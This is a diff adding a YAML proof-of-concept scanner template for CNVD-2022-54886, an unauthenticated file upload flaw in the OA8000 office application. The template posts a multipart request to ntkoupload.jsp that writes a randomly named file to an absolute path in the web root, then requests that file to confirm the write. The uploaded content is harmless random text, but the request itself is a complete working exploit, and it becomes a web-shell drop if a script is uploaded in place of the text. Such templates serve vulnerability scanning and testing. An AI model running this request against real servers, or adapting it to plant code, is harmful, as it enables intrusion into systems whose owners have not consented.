@@ -1,0 +1,43 @@
+id: poc-yaml-oa8000-ntkoupload-cnvd-2022-54886-upload
+
+info:
+  name: poc-yaml-oa8000-ntkoupload-cnvd-2022-54886-upload
+  author: iak3ec(https://github.com/nu0l)
+  severity: high
+  tags: xray-converted,fileupload,cnvd-2022-54886,ct-517590
+  reference:
+    - https://github.com/Phuong39/2022-HW-POC
+
+http:
+  - raw:
+      - |
+        POST /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
+
+        ------WebKitFormBoundaryzRSYXfFlXqk6btQm
+        Content-Disposition: form-data; name="EDITFILE"; filename="{{rand_base(8)}}.txt"
+        Content-Type: image/png
+        
+        {{rand_base(8)}}
+        ------WebKitFormBoundaryzRSYXfFlXqk6btQm
+        Content-Disposition: form-data; name="newFileName"
+        
+        D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/{{rand_base(8)}}.txt
+        ------WebKitFormBoundaryzRSYXfFlXqk6btQm--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /OAapp/htpages/app/module/login/{{rand_base(8)}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
